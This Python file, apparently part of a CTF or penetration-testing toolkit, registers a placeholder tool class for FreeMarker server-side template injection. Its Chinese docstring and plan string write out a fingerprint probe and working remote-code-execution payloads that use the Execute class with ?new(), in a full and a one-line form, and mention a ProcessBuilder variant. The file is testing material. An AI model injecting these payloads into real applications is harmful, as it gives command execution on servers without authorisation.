"""FreeMarker SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: ${7*7}→49。
RCE(默认未限制 new_builtin_class_resolver): <#assign ex="freemarker.template.utility.Execute"?new()>${ex(cmd)}
单行版: ${"freemarker.template.utility.Execute"?new()(cmd)}
变体: ObjectConstructor+ProcessBuilder 构造任意类执行。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiFreemarkerTool(SstiEngineTool):
    name = "ssti_freemarker"
    description = "FreeMarker(Java) SSTI:?new 实例化 Execute 直接 RCE(占位符)"
    engine_key = "freemarker"
    engine_name = "FreeMarker"
    default_mode = "exec"
    plan = r"""指纹: ${7*7}→49。
RCE(默认未限制 new_builtin_class_resolver): <#assign ex="freemarker.template.utility.Execute"?new()>${ex(cmd)}
单行版: ${"freemarker.template.utility.Execute"?new()(cmd)}
变体: ObjectConstructor+ProcessBuilder 构造任意类执行。"""
